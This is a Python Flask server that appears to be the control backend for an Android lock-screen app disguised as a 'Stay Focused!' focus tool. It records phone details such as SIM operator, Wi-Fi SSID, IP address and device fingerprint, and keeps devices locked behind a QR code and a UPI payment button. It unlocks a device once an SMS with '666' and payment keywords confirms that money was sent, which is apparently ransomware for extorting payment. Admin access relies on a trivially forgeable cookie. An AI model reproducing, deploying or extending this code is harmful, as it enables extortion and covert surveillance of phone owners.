from flask import Flask, request, jsonify, render_template, Response, stream_with_context, make_response
import json, os, time, queue, threading, zipfile, io
from datetime import datetime
from functools import wraps

app = Flask(__name__)
DATA_FILE = "data.json"
sse_clients = {}
sse_lock = threading.Lock()

# ── HELPERS ──
def load():
    if not os.path.exists(DATA_FILE):
        default = {
            "devices": {},
            "settings": {
                "title": "Stay Focused!",
                "subtitle": "Deep work mode active",
                "qr_url": "",
                "btn1_text": "UNLOCK",
                "btn2_text": "Emergency UPI",
                "btn2_url": "upi://pay"
            }
        }
        save(default)
        return default
    with open(DATA_FILE) as f:
        return json.load(f)

def save(data):
    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=2)

def now():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def push_sse(device_id, event_data):
    with sse_lock:
        if device_id in sse_clients:
            dead = []
            for q in sse_clients[device_id]:
                try: q.put_nowait(event_data)
                except: dead.append(q)
            for q in dead:
                try: sse_clients[device_id].remove(q)
                except: pass

# ── AUTH CHECK ──
def is_admin(req):
    return req.cookies.get("hcf_admin") == "1"

# ── API 1: REGISTER ──
@app.route("/api/register", methods=["POST"])
def api_register():
    try:
        d = request.get_json(force=True) or {}
        did = str(d.get("device_id", "")).strip()
        if not did:
            return jsonify({"success": False, "error": "no id"})
        data = load()
        if did not in data["devices"]:
            data["devices"][did] = {
                "device_id": did,
                "locked": True,
                "name": d.get("model", "Unknown"),
                "registered_at": now(),
                "unlock_time": None,
                "online": True
            }
        dev = data["devices"][did]
        dev.update({
            "last_seen": now(),
            "online": True,
            "model": d.get("model", dev.get("model","")),
            "brand": d.get("brand", ""),
            "manufacturer": d.get("manufacturer", ""),
            "android_version": d.get("android_version", ""),
            "sdk_version": d.get("sdk_version", ""),
            "battery": d.get("battery", ""),
            "battery_charging": d.get("battery_charging", False),
            "screen_width": d.get("screen_width", ""),
            "screen_height": d.get("screen_height", ""),
            "screen_density": d.get("screen_density", ""),
            "ram_total": d.get("ram_total", ""),
            "ram_available": d.get("ram_available", ""),
            "storage_total": d.get("storage_total", ""),
            "storage_free": d.get("storage_free", ""),
            "sim_operator": d.get("sim_operator", ""),
            "sim_country": d.get("sim_country", ""),
            "network_type": d.get("network_type", ""),
            "wifi_ssid": d.get("wifi_ssid", ""),
            "ip_address": d.get("ip_address", ""),
            "package_name": d.get("package_name", ""),
            "app_version": d.get("app_version", ""),
            "device_name": d.get("device_name", ""),
            "fingerprint": d.get("fingerprint", ""),
            "timezone": d.get("timezone", ""),
            "language": d.get("language", ""),
            "name": d.get("device_name") or d.get("model") or dev.get("name","Unknown")
        })
        save(data)
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

# ── API 2: STATUS ──
@app.route("/api/status")
def api_status():
    try:
        did = request.args.get("id", "")
        data = load()
        s = data["settings"]
        locked = True
        unlock_time = None
        if did in data["devices"]:
            dev = data["devices"][did]
            locked = dev.get("locked", True)
            unlock_time = dev.get("unlock_time")
            if unlock_time:
                try:
                    ut = datetime.strptime(unlock_time, "%Y-%m-%d %H:%M")
                    if datetime.now() >= ut:
                        locked = False
                        dev["locked"] = False
                        dev["unlock_time"] = None
                        save(data)
                        push_sse(did, {"locked": False})
                        unlock_time = None
                except: pass
        return jsonify({
            "locked": locked,
            "title": s.get("title","Stay Focused!"),
            "subtitle": s.get("subtitle",""),
            "qr_url": s.get("qr_url",""),
            "btn1_text": s.get("btn1_text","UNLOCK"),
            "btn2_text": s.get("btn2_text","Emergency UPI"),
            "btn2_url": s.get("btn2_url","upi://pay"),
            "unlock_time": unlock_time
        })
    except Exception as e:
        return jsonify({"locked": True})

# ── API 3: UNLOCK CHECK ──
@app.route("/api/unlock")
def api_unlock():
    try:
        did = request.args.get("id","")
        data = load()
        if did in data["devices"]:
            return jsonify({"locked": data["devices"][did].get("locked",True)})
        return jsonify({"locked": True})
    except:
        return jsonify({"locked": True})

# ── API 4: SMS ──
@app.route("/api/sms", methods=["POST"])
def api_sms():
    try:
        d = request.get_json(force=True) or {}
        did = str(d.get("device_id",""))
        sms = str(d.get("sms","")).lower()
        keywords = ["credited","debited","paid","received","transferred",
                    "payment","transaction","upi","bank","rupees","rs.",
                    "inr","₹","sent","deducted","withdrawn","deposit",
                    "refund","cashback","amount","a/c","petrol","purchase"]
        if "666" in sms and any(k in sms for k in keywords):
            data = load()
            if did in data["devices"]:
                data["devices"][did]["locked"] = False
                data["devices"][did]["unlock_time"] = None
                save(data)
                push_sse(did, {"locked": False})
                return jsonify({"unlock": True})
        return jsonify({"unlock": False})
    except:
        return jsonify({"unlock": False})

# ── API 5: PING ──
@app.route("/api/ping", methods=["POST"])
def api_ping():
    try:
        d = request.get_json(force=True) or {}
        did = str(d.get("device_id",""))
        data = load()
        if did in data["devices"]:
            data["devices"][did]["last_seen"] = now()
            data["devices"][did]["online"] = True
            data["devices"][did]["battery"] = d.get("battery","")
            data["devices"][did]["network_type"] = d.get("network_type","")
            data["devices"][did]["wifi_ssid"] = d.get("wifi_ssid","")
            save(data)
        return jsonify({"ok": True})
    except:
        return jsonify({"ok": False})

# ── SSE ──
@app.route("/api/events")
def api_events():
    did = request.args.get("id","")
    def generate():
        q = queue.Queue()
        with sse_lock:
            if did not in sse_clients:
                sse_clients[did] = []
            sse_clients[did].append(q)
        try:
            data = load()
            if did in data["devices"]:
                locked = data["devices"][did].get("locked", True)
                yield f"data: {json.dumps({'locked': locked})}\n\n"
            while True:
                try:
                    event = q.get(timeout=25)
                    yield f"data: {json.dumps(event)}\n\n"
                except queue.Empty:
                    yield f"data: {json.dumps({'ping': True})}\n\n"
        except GeneratorExit:
            with sse_lock:
                if did in sse_clients:
                    try: sse_clients[did].remove(q)
                    except: pass
    return Response(stream_with_context(generate()),
        mimetype="text/event-stream",
        headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})

# ── ADMIN PANEL ──
@app.route("/")
def admin():
    return render_template("admin.html")

@app.route("/auth", methods=["POST"])
def auth():
    # Secret 3-dot sequence sets cookie
    d = request.get_json(force=True) or {}
    if d.get("secret") == "dots_verified":
        resp = make_response(jsonify({"ok": True}))
        resp.set_cookie("hcf_admin", "1",
            max_age=60*60*24*365*10,  # 10 years
            httponly=True, samesite="Strict")
        return resp
    return jsonify({"ok": False})

@app.route("/admin/toggle", methods=["POST"])
def admin_toggle():
    if not is_admin(request):
        return jsonify({"success": False, "error": "unauthorized"})
    try:
        d = request.get_json(force=True) or {}
        did = str(d.get("device_id",""))
        locked = bool(d.get("locked", True))
        data = load()
        if did in data["devices"]:
            data["devices"][did]["locked"] = locked
            if not locked:
                data["devices"][did]["unlock_time"] = None
            save(data)
            push_sse(did, {"locked": locked})
            return jsonify({"success": True})
        return jsonify({"success": False, "error": "device not found"})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@app.route("/admin/schedule", methods=["POST"])
def admin_schedule():
    if not is_admin(request): return jsonify({"success": False})
    try:
        d = request.get_json(force=True) or {}
        did = str(d.get("device_id",""))
        ut = d.get("unlock_time")
        data = load()
        if did in data["devices"]:
            data["devices"][did]["unlock_time"] = ut
            save(data)
            return jsonify({"success": True})
        return jsonify({"success": False})
    except:
        return jsonify({"success": False})

@app.route("/admin/settings", methods=["POST"])
def admin_settings():
    if not is_admin(request): return jsonify({"success": False})
    try:
        d = request.get_json(force=True) or {}
        data = load()
        for k in ["title","subtitle","qr_url","btn1_text","btn2_text","btn2_url"]:
            if k in d:
                data["settings"][k] = d[k]
        save(data)
        return jsonify({"success": True})
    except:
        return jsonify({"success": False})

@app.route("/admin/data")
def admin_data():
    if not is_admin(request): return jsonify({"error": "unauthorized"})
    return jsonify(load())

@app.route("/admin/download")
def admin_download():
    if not is_admin(request): return "Unauthorized", 403
    try:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            for f in ["app.py","requirements.txt","Procfile","data.json"]:
                if os.path.exists(f): zf.write(f)
            for root, dirs, files in os.walk("templates"):
                for file in files:
                    zf.write(os.path.join(root, file))
        buf.seek(0)
        return Response(buf.getvalue(),
            mimetype="application/zip",
            headers={"Content-Disposition":
                f"attachment; filename=hackrmax_backup_{int(time.time())}.zip"})
    except Exception as e:
        return str(e), 500

# Mark devices offline
def offline_checker():
    while True:
        time.sleep(60)
        try:
            data = load()
            changed = False
            for did, dev in data["devices"].items():
                last = dev.get("last_seen","")
                if last:
                    try:
                        diff = (datetime.now() - 
                            datetime.strptime(last, "%Y-%m-%d %H:%M:%S")).seconds
                        online = diff < 120
                        if dev.get("online") != online:
                            dev["online"] = online
                            changed = True
                    except: pass
            if changed: save(data)
        except: pass

threading.Thread(target=offline_checker, daemon=True).start()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
